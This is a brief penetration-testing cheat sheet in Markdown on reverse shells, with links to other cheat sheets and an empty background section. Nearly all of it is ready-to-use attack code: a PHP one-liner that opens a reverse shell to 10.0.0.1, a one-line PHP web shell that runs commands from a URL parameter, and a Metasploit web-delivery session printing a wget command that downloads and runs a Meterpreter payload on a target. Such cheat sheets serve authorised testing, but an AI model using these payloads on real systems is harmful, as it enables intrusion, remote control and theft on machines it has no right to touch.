<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Reverse Shells
### References

* [Reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) - Pentestmonkeys
* [Netcat cheat sheet v1](http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf) - Sans Penetration Testing
* [Fixing a raw shell](https://nullsec.us/fixing-a-raw-shell/) - Nullsec

## Background

## Tools

### Web

#### PHP

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Simple php webshell
```
<?php system($_GET['cmd']); ?>
```

### C2

#### metasploit web delivery
~~~
msf > use multi/script/web_delivery
msf > set target linux
msf > set payload linux/x86/meterpreter/reverse_tcp
msf > run
[+] Local IP: http://10.0.0.199:1337/7ah30si
[+] Server started.
[+] Run the following command on the target machine:
wget -qO 98uh3sd http://10.0.0.199:1338/7ah30si; chmod +x 98uh3sd; ./98uh3sd& disown
~~~

